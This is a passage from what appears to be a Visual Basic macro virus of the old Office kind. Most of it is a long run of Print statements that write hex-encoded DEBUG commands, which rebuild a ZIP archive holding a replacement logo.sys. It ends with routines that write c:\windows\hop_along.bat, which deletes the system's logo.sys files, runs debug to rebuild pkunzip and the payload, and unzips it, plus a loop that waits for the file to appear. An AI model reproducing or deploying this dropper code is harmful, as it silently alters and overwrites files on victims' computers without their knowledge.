Print #3, "E 0700 67 47 7E 22 4A 63 BE CC EF E5 A9 C0 FF 5C 4B 7E"
Print #3, "E 0710 17 B3 B9 21 54 E1 7F 4E 37 B4 BA DD A3 F8 AB 68"
Print #3, "E 0720 6E 7E F0 17 4B 80 FF 59 06 FC CF 32 E0 7F 96 01"
Print #3, "E 0730 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB"
Print #3, "E 0740 80 FF 59 06 FC CF 32 E0 7F 96 01 FF B3 0C F8 9F"
Print #3, "E 0750 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF 59 06 FC"
Print #3, "E 0760 CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C 03"
Print #3, "E 0770 FE 67 19 F0 3F CB 80 FF 59 06 FC CF 32 E0 7F 96"
Print #3, "E 0780 01 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F"
Print #3, "E 0790 CB 80 FF 59 06 FC CF 32 E0 7F 96 01 FF B3 0C F8"
Print #3, "E 07A0 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF 59 06"
Print #3, "E 07B0 FC CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C"
Print #3, "E 07C0 03 FE 67 19 B5 FA 9F A7 93 87 FB BB DB D1 70 10"
Print #3, "E 07D0 F5 E2 27 3D EC B7 EB D5 62 36 1D DF DF E5 DE 47"
Print #3, "E 07E0 D2 58 EE 73 D5 5D D2 E5 D3 6F D4 EF BB 46 FF F3"
Print #3, "E 07F0 6C 3A 19 73 7E C3 41 3F EA 05 D6 BA 7A D8 6D D7"
Print #3, "E 0800 4B CA 6A 7C 7F 9B 7B 1F B4 9C 4F B3 9F 0B 1E 76"
Print #3, "E 0810 1B BB 4C 7B D8 EF 05 AA 39 D4 E8 7F 9E 4E 26 14"
Print #3, "E 0820 09 4F 3F 7A DB 1D 74 52 6D 23 65 75 F1 19 7E 21"
Print #3, "E 0830 BF FD 36 CE 6F 10 85 41 B1 F8 05 A9 D1 FF CC D3"
Print #3, "E 0840 8F F3 1B D0 09 67 D8 ED A4 DA C1 45 3E 2B 33 36"
Print #3, "E 0850 9B 64 3F 17 A4 BD DC 2E D3 A6 FC 9A 24 0C AE D1"
Print #3, "E 0860 FF 3C 19 73 7E 34 FD 28 BF A0 DB CE E4 37 9B F8"
Print #3, "E 0870 F2 DB 6D E2 FC FA C9 AE DF 08 6A F4 3F F3 D1 8F"
Print #3, "E 0880 F3 EB D3 09 27 ED BE A9 76 70 9E CF CA 8C D1 2B"
Print #3, "E 0890 4A E6 2A 1D FE 38 51 3A 78 52 7E 4D 12 06 D7 E8"
Print #3, "E 08A0 7F 1E 3F 70 7E FC EA 41 6F BB 3B AD 4C 7E D3 B1"
Print #3, "E 08B0 2F 3F 7E 91 36 97 68 F7 6D 52 7E 35 FA 9F F9 C5"
Print #3, "E 08C0 37 BE 4C BB 6F AA 1D 9C E5 B3 32 63 34 D9 32 57"
Print #3, "E 08D0 E9 F0 67 97 69 53 7E 4D 12 06 D7 E8 7F 7E B8 4F"
Print #3, "E 08E0 F3 A3 DD 37 93 DF E4 21 9B 1F 9F 11 9A FC D2 D7"
Print #3, "E 08F0 8A CD 2A CE AF 97 7D E5 7E 79 6A F4 3F F3 B9 5F"
Print #3, "E 0900 7C 99 76 5F A3 1D E4 60 A6 F6 C0 66 6F E3 D7 5A"
Print #3, "E 0910 DE 7D E9 95 3A 93 DF C2 2E D3 A6 FC EA 12 06 BF"
Print #3, "E 0920 0B 35 FA 9F EF EF D2 FC 68 F7 35 F9 25 6F 3E 06"
Print #3, "E 0930 49 7E 3B 9D 29 9F 50 67 5E 2B 96 49 97 4F A3 76"
Print #3, "E 0940 DF 3A FD CF 6F 92 1A FD CF 6F 92 2A FC CF D7 4C"
Print #3, "E 0950 05 FE E7 AB A6 02 FF F3 55 53 81 FF F9 AA A9 C0"
Print #3, "E 0960 FF 7C D5 54 E0 7F BE 6A 2A F0 3F 5F 35 15 F8 9F"
Print #3, "E 0970 AF 9A 0A FC CF 57 4D 05 FE E7 AB A6 0A FF F3 35"
Print #3, "E 0980 03 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F"
Print #3, "E 0990 CB 80 FF 59 06 FC CF 32 E0 7F 96 01 FF B3 0C F8"
Print #3, "E 09A0 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF 59 06"
Print #3, "E 09B0 FC CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C"
Print #3, "E 09C0 03 FE 67 19 F0 3F CB 80 FF 59 46 15 FE E7 20 0C"
Print #3, "E 09D0 7B BD 28 8A FA 84 1D EA F7 23 D3 96 1D 04 DD B8"
Print #3, "E 09E0 5F E3 F1 74 BA F8 A8 B4 DF 0B B9 95 E1 F1 A4 FB"
Print #3, "E 09F0 08 33 37 D0 D8 71 9F 76 2D 68 9E A8 2A 73 95 7B"
Print #3, "E 0A00 C0 9E 69 8C 7B E3 E2 3A D3 DB 19 D4 D7 22 52 85"
Print #3, "E 0A10 FF 99 F2 33 01 52 84 76 88 2F F3 BF 21 C7 97 E4"
Print #3, "E 0A20 77 BC F8 A8 8F 1B 31 DB 67 CA 8A 1B 2C 33 F9 B5"
Print #3, "E 0A30 CF 3A 98 7C 7E 94 68 3E BF 24 F9 D5 C2 D6 E9 DE"
Print #3, "E 0A40 4E 6E 4E 6C D7 B4 AA BB 2A FF 33 05 98 ED CB 8D"
Print #3, "E 0A50 22 7D 55 CF BE B8 5F E3 74 2C C9 2F 2C ED C6 A2"
Print #3, "E 0A60 4C 4B 56 D5 F1 8C CC 5C CD F5 80 A5 F0 F4 53 ED"
Print #3, "E 0A70 D6 B9 9E 65 A1 55 F9 9F 79 06 66 AE F6 7A 71 7E"
Print #3, "E 0A80 14 5F 92 DF E1 E2 A3 BE 5E 59 37 96 AB C5 83 A7"
Print #3, "E 0A90 5A E6 6A 90 ED 01 4B D1 F9 29 CA AF 96 75 8D 55"
Print #3, "E 0AA0 F9 9F 79 1F CE 5C ED F5 F8 AA 99 7D F1 AE 74 3C"
Print #3, "E 0AB0 94 E4 17 5C B6 73 38 3B DC 28 BF EC DF 7A 73 3D"
Print #3, "E 0AC0 60 29 F6 E8 F7 FC F4 58 C7 C2 A8 AA FC CF 41 90"
Print #3, "E 0AD0 CB 2F E4 38 29 3E DA 93 DA AD 24 BF FD C5 47 7D"
Print #3, "E 0AE0 7C A8 3A 3F D1 8E 99 19 73 76 B8 D1 EE 9B CF CF"
Print #3, "E 0AF0 1E 38 F3 55 75 E7 57 8D BF B8 1B 04 41 E6 6A 18"
Print #3, "E 0B00 06 F6 95 97 E2 B3 7B D9 61 BF DF 6D D6 AB E5 62"
Print #3, "E 0B10 9E AA 0D 72 7D D4 16 67 87 1B BF 20 67 AE 26 3D"
Print #3, "E 0B20 60 79 28 3E BE 3B C5 57 C7 C2 A8 AA FC CF DD 6E"
Print #3, "E 0B30 2E BF 20 8E 4F 51 7C 49 7E BB 8B 8F FA 72 7D D4"
Print #3, "E 0B40 C9 20 9D 97 94 2D 8A A5 A9 96 CF AF F4 10 67 F2"
Print #3, "E 0B50 AB 69 FA 55 E6 7F EE F0 BE 9A C2 E9 99 13 17 8A"
Print #3, "E 0B60 CF 1E A5 F6 BB 92 FC CA 5F 43 F9 EC 2F 37 A0 E7"
Print #3, "E 0B70 9A 96 48 A4 CD 9A BC FB 96 DC 97 E2 6B D5 16 5F"
Print #3, "E 0B80 25 FE E7 56 BB DD EE 70 80 34 09 ED 50 37 8E 4F"
Print #3, "E 0B90 51 7C 49 7E 5B BD FB 6A 0F 87 ED 64 E5 3E EA A7"
Print #3, "E 0BA0 13 1F D8 B8 8F 30 7D 48 3E 55 DE AC 53 89 44 C7"
Print #3, "E 0BB0 9E 4F 9B 2E 74 33 66 0E 9C BA DB 30 11 00 E8 73"
Print #3, "E 0BC0 67 6E 4E 7C AA 69 55 77 15 FE E7 73 AB C5 01 EA"
Print #3, "E 0BD0 04 ED 10 A7 67 5E 44 29 3E BB 97 ED B6 FC 46 81"
Print #3, "E 0BE0 8E 7E 5A 03 63 EB D2 37 1F 05 E1 CB C1 B6 EC 9B"
Print #3, "E 0BF0 6B FA A5 22 6E 6C B5 F7 B5 6F 3E F8 E4 79 1A D7"
Print #3, "E 0C00 E9 73 E7 BA CE 5D 18 F8 9F 65 C0 FF 2C 03 FE 67"
Print #3, "E 0C10 19 F0 3F CB 80 FF 59 06 FC CF 32 E0 7F 96 01 FF"
Print #3, "E 0C20 B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80"
Print #3, "E 0C30 FF 59 06 FC CF 32 E0 7F 96 51 AB FF F9 0D 52 A3"
Print #3, "E 0C40 FF F9 4D 52 A3 FF F9 4D 52 A3 FF F9 4D 52 A3 FF"
Print #3, "E 0C50 F9 4D 52 A3 FF F9 4D 52 A3 FF F9 4D 52 A3 FF B9"
Print #3, "E 0C60 04 B3 76 CF 0A 64 A3 64 30 23 1B FF BF 77 6F 00"
Print #3, "E 0C70 35 FA 9F 5D 14 F4 ED E9 2A 17 F6 17 97 DE A3 41"
Print #3, "E 0C80 D4 E8 7F 76 91 7E FA 9D E7 36 9D 92 CD A5 46 FF"
Print #3, "E 0C90 B3 8B 32 7D BB 52 C5 2F 54 69 28 0D F0 3F F3 97"
Print #3, "E 0CA0 CF 5C 0C D2 E1 EF 55 7C 2E D8 00 FF F3 34 FF 55"
Print #3, "E 0CB0 01 4C E1 DB 3F 1A 4C 03 FC CF D3 71 31 BF 65 C9"
Print #3, "E 0CC0 17 D2 34 94 06 F8 9F F9 BB A3 B2 D7 37 49 37 C2"
Print #3, "E 0CD0 2B A0 01 FE E7 C9 43 2E 3F 3E FB 33 97 1A F6 55"
Print #3, "E 0CE0 33 A5 BC AC FF 59 AF DD A3 DD 77 34 E4 46 24 33"
Print #3, "E 0CF0 C6 8B FC F8 EC 79 D4 B0 6F 8A 2A 07 FE 67 19 F0"
Print #3, "E 0D00 3F CB 80 FF 59 06 FC CF 32 E0 7F 96 01 FF B3 0C"
Print #3, "E 0D10 F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF 59"
Print #3, "E 0D20 06 FC CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF"
Print #3, "E 0D30 2C 03 FE 67 19 F0 3F CB 80 FF 59 06 FC CF 32 E0"
Print #3, "E 0D40 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19"
Print #3, "E 0D50 F0 3F CB A8 C8 FF 1C F5 FB 03 66 98 59 F3 C8 0E"
Print #3, "E 0D60 D9 28 B3 80 39 75 7A B1 04 CB 5C 1A F4 7B 97 4B"
Print #3, "E 0D70 74 79 E1 46 DB 68 B1 72 E7 A6 6C FB CB 5C 8D 72"
Print #3, "E 0D80 02 59 33 76 3B 1A DA 76 7A D6 38 A9 F7 4F 35 FE"
Print #3, "E 0D90 E7 5E 6A 8E 4D E0 F8 8C 86 D2 F2 F4 98 E4 B7 98"
Print #3, "E 0DA0 C7 F9 45 BD A0 78 C7 61 92 69 BA 94 48 F3 9C F7"
Print #3, "E 0DB0 2C 96 B9 2B 29 3F F3 83 D4 14 5F 35 FE E7 5E AF"
Print #3, "E 0DC0 77 B1 52 D9 18 8C 7B 61 AA 05 4C 8D 86 CB C5 DC"
Print #3, "E 0DD0 BA D6 FA 51 98 DC 1E 43 F9 D9 B1 42 7E 3C D5 32"
Print #3, "E 0DE0 57 CB 3C 8B 34 FD 74 7E 9D 4E 4D 02 DE AA FC CF"
Print #3, "E 0DF0 C5 B1 BE 15 18 B3 08 D0 0E A5 FE E7 E5 3C 76 D5"
Print #3, "E 0E00 A5 CB AE 52 06 49 A6 7E FF B3 2A C0 FE E7 44 41"
Print #3, "E 0E10 59 07 15 F8 9F BB 79 F5 A9 26 F6 3F 1B 93 9D B9"
Print #3, "E 0E20 94 FA 9F 53 83 67 CE FF 6C EF 9B AE 5B 7B 47 FF"
Print #3, "E 0E30 73 66 8C FD CF 5A AA AA 6A A2 02 FF 73 41 DD A9"
Print #3, "E 0E40 B1 FE 67 BE 35 EF 7F 66 85 A2 62 85 A2 AD 4B FC"
Print #3, "E 0E50 CF DB EC B2 49 9B 1F F7 D1 A4 8F 59 E6 7F 7E 2A"
Print #3, "E 0E60 64 3A E4 17 24 AD 50 7C 45 FE E7 82 3B 56 43 87"
Print #3, "E 0E70 44 3D 29 D3 F8 8C FF 99 F2 5B 2A DA 7D 13 5F 64"
Print #3, "E 0E80 EC 2A 66 83 A2 B9 94 2E 3B 2D E4 F7 0E FE 67 A3"
Print #3, "E 0E90 1F EF B2 B4 F6 B9 16 05 65 25 FE E7 B2 19 18 86"
Print #3, "E 0EA0 7C 14 CB C4 A7 FD CF C6 E0 39 9F 26 BE CD E4 35"
Print #3, "E 0EB0 74 93 EC AB A9 FF 99 75 93 99 87 7C 07 FF 33 E5"
Print #3, "E 0EC0 67 8F 25 AF CA FF 5C 1A A0 71 C8 A6 47 22 F6 3F"
Print #3, "E 0ED0 73 7E C6 E0 19 17 C5 05 E9 AA F1 D4 FF 9C E6 C7"
Print #3, "E 0EE0 4A 5E E3 7F 4E 5B 1B F8 C0 A9 0A F0 F4 33 97 5E"
Print #3, "E 0EF0 97 FF 99 03 64 05 79 F6 95 24 EB BE 67 8C FF D9"
Print #3, "E 0F00 BC 7A 8C E3 FC 92 53 E0 75 72 AA 92 9E 97 AC 12"
Print #3, "E 0F10 27 AA 7E A9 88 05 A8 F6 BE A9 7A 76 99 BC 1E F5"
Print #3, "E 0F20 F9 05 C9 18 50 EB F2 17 57 E3 7F BE 56 AA F2 3F"
Print #3, "E 0F30 5F 2B 55 F8 9F AF 99 2A FC CF D7 0C FC CF 32 E0"
Print #3, "E 0F40 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19"
Print #3, "E 0F50 F0 3F CB 80 FF 59 06 FC CF 32 E0 7F 96 01 FF B3"
Print #3, "E 0F60 0C F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF"
Print #3, "E 0F70 59 06 FC CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0"
Print #3, "E 0F80 FF 2C 03 FE 67 19 2F EB 7F 7E FD 34 C0 FF FC AA"
Print #3, "E 0F90 69 80 FF F9 55 D3 00 FF F3 AB A6 01 FE E7 57 4D"
Print #3, "E 0FA0 03 FC CF AF 9A 06 F8 9F 5F 35 F5 FB 9F 79 79 7C"
Print #3, "E 0FB0 E6 EA 62 16 AF 85 4E D7 83 B3 94 F7 9E BF BD 82"
Print #3, "E 0FC0 97 ED C6 AB C0 63 25 AF 6E 77 50 4D A1 7E FF 73"
Print #3, "E 0FD0 98 6F 6E 49 BF BD 82 97 F2 66 6E 18 0D 72 DF FE"
Print #3, "E 0FE0 31 4D 2C DB E7 A7 53 73 94 71 F5 FB 9F 0B CD 41"
Print #3, "E 0FF0 E9 7A E6 C2 7A 70 D7 B7 7F F0 7A E9 B2 F1 97 A1"
Print #3, "E 1000 7E FF 73 90 6F 4D 4B BF BD 82 DB 61 32 37 0C FB"
Print #3, "E 1010 65 F9 05 9D CB A6 85 97 A4 7E FF 73 B7 90 1F EB"
Print #3, "E 1020 DB 87 DC F3 C6 2B F1 33 37 A4 6D 84 19 F8 F0 77"
Print #3, "E 1030 31 F8 92 D4 EF 7F EE E6 3B 4B A7 E6 8B 8E 22 D3"
Print #3, "E 1040 CD 96 B9 A1 A4 B5 B5 AC DB F0 85 A9 DF FF 5C E8"
Print #3, "E 1050 CC E5 EF 8E 32 97 B8 9B 2D 73 C3 A5 FE BE 74 46"
Print #3, "E 1060 BE 30 F5 FB 9F 3B F9 D6 BE F4 DB 2B B8 1D 26 73"
Print #3, "E 1070 43 71 B2 DD 35 F2 EB 90 EA F5 3F 73 67 A5 6E 8D"
Print #3, "E 1080 3C 25 6D 93 BC FB 9A 4B DC 8C 9A A9 2D 7C 7B 05"
Print #3, "E 1090 9F FD 99 4B A7 7C 1B E6 CB 52 AF FF 59 B7 96 EA"
Print #3, "E 10A0 DE AA 43 9C C1 38 F9 A2 A3 F4 BC D8 9E 2A EB B3"
Print #3, "E 10B0 E7 B8 65 DF 9C 4F 6B 2F C2 A1 41 C6 4C F8 9F 65"
Print #3, "E 10C0 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF 59 06 FC CF"
Print #3, "E 10D0 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C 03 FE"
Print #3, "E 10E0 67 19 F0 3F CB 80 FF 59 06 FC CF 32 E0 7F 96 01"
Print #3, "E 10F0 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19 15 F9 9F"
Print #3, "E 1100 AF 96 6A FC CF D7 4B 25 FE E7 2B A6 0A FF F3 35"
Print #3, "E 1110 53 81 FF F9 AA A9 C0 FF 7C D5 54 E1 7F BE 66 2A"
Print #3, "E 1120 F1 3F 5F 31 D5 F8 9F AF 97 8A FC CF 57 0B FC CF"
Print #3, "E 1130 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C 03 FE"
Print #3, "E 1140 67 19 F0 3F CB 80 FF 59 06 FC CF 32 E0 7F 96 01"
Print #3, "E 1150 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB"
Print #3, "E 1160 80 FF 59 06 FC CF 32 E0 7F 96 01 FF B3 0C F8 9F"
Print #3, "E 1170 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF 59 06 FC"
Print #3, "E 1180 CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C 03"
Print #3, "E 1190 FE 67 19 F0 3F CB 80 FF 59 06 FB 9F F9 6F 80 03"
Print #3, "E 11A0 5E 88 CA CD E8 5B 36 CA 9E F9 CF 5A BC B4 E8 61"
Print #3, "E 11B0 CC 0D D6 2C 19 3B F2 9E DE EE D0 78 D4 1F 0C 47"
Print #3, "E 11C0 B7 77 F7 0F E3 F1 64 3A 9B CD E7 8B E5 72 B9 5A"
Print #3, "E 11D0 AD 99 8D 41 5F 5E AD 68 7C 31 9F CF 66 D3 C9 78"
Print #3, "E 11E0 FC 70 7F 77 3B 1A 0E FA 51 8F 1D 6C 2C 81 3D 1E"
Print #3, "E 11F0 76 DB F5 8A 5D C5 0F 77 A3 44 AE 76 DC 6F D7 4B"
Print #3, "E 1200 E3 2F 36 B6 62 F6 AD 6D 56 8B 99 96 B2 59 A5 F1"
Print #3, "E 1210 91 87 A8 2A 76 57 06 DA EA A6 1F 71 B3 5E 2D 17"
Print #3, "E 1220 B3 29 3D 25 3F 23 3D E5 70 30 E8 F7 A3 A8 D7 EB"
Print #3, "E 1230 85 59 E8 7A 14 F5 FB 83 C1 90 36 46 6F CD 64 3A"
Print #3, "E 1240 9D 2D 96 AB F5 C6 6E 2D BF B5 E5 8F 77 6F EF B8"
Print #3, "E 1250 C9 6D C9 A6 30 DE 5B F9 2F F6 BC 6A 92 3B A7 D9"
Print #3, "E 1260 9E 68 87 4C 7E 66 88 4F 0A F9 83 B9 D1 2D B7 27"
Print #3, "E 1270 2D D8 51 44 A9 D2 4B 75 8B F2 0B 29 C0 E1 C8 04"
Print #3, "E 1280 38 B1 01 2E 38 40 93 60 CC 8A E3 5B D8 F8 CC C6"
Print #3, "E 1290 8C 28 A5 A8 C7 0E BB D6 F9 F9 91 15 80 9B F5 92"
Print #3, "E 12A0 FD CF F7 B7 23 B6 75 76 5A 71 58 39 FF B3 49 74"
Print #3, "E 12B0 96 F3 3F EF B7 1C 29 BB 2B 39 D3 D0 3E E2 61 4F"
Print #3, "E 12C0 F9 51 7C F3 99 89 EF CE C6 17 71 7C 3A B5 C0 60"
Print #3, "E 12D0 13 A4 71 1B E0 9D 09 70 46 73 61 45 F9 ED 0F 76"
Print #3, "E 12E0 6B 43 9D D5 3D 77 A9 B2 29 EC C8 A7 2B 3C DB 74"
Print #3, "E 12F0 7E 66 B6 5D 46 AA 87 EC 9C D4 65 7C D7 03 EF E9"
Print #3, "E 1300 3C 01 C3 74 02 9A DF 19 3D A9 0D 30 89 50 5F E6"
Print #3, "E 1310 F8 16 1C 1F 6F 4C 3A FD D8 FF 4C 41 D1 1C E2 10"
Print #3, "E 1320 74 30 76 AE 25 33 AB 30 D9 D2 19 D9 8F 67 24 0F"
Print #3, "E 1330 65 92 67 77 AA 7D 44 9E 7E F3 CC 6F 2C 9E 7D 69"
Print #3, "E 1340 78 49 84 C9 0C 4C 67 C3 DC 4C 40 BD B5 FC D6 36"
Print #3, "E 1350 37 8B D8 75 6A F6 D6 7E 66 6F FD 1F 50 4B 01 02"
Print #3, "E 1360 14 00 14 00 00 00 08 00 38 51 9B 28 17 D3 09 49"
Print #3, "E 1370 36 12 00 00 36 F8 01 00 08 00 00 00 00 00 00 00"
Print #3, "E 1380 00 00 20 00 B6 81 00 00 00 00 6C 6F 67 6F 2E 53"
Print #3, "E 1390 59 53 50 4B 05 06 00 00 00 00 01 00 01 00 36 00"
Print #3, "E 13A0 00 00 5C 12 00 00 00 00"
Print #3, "RCX"
Print #3, "12A8"
Print #3, "W"
Print #3, "Q"
Close #3
End Sub

Sub CreateBat()
Open "c:\windows\hop_along.bat" For Output As #4
Print #4, "del c:\windows\logo.sys"
Print #4, "del c:\logo.sys"
Print #4, "cd c:\windows\"
Print #4, "debug < c:\windows\pkunzip.dbg"
Print #4, "debug < c:\windows\logo.dbg"
Print #4, "c:\windows\pkunzip.com logo.zip"
Print #4, "exit"
Close #4
End Sub


Sub Wait4Bat()
If Dir("c:\windows\logo.sys") = "" Then Wait4Bat
End Sub